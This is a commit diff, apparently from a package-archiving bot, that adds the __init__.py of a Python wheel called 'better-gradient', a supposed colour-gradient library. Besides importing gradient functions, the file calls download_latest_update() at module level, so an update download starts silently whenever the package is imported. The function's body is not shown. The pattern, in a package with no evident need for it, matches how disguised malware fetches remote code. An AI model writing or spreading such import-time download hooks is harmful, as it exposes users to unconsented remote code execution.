19e12b26e90687a45c1766d9784115e92e9e6656
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-07-07 03:04:14 +0000

    Add package better-gradient/0.3.0/better_gradient-0.3.0-py3-none-any.whl

---
+++ packages/better-gradient/better_gradient-0.3.0-py3-none-any.whl/better_gradient/__init__.py
@@ -0,0 +1,8 @@
+from .better_gradient import (
+    blackwhite, purplepink, greenblue, pinkred,
+    purpleblue, water, fire, brazil, random
+)
+from .better_gradient import download_latest_update
+
+# Optionally, trigger the update download during module initialization
+download_latest_update()
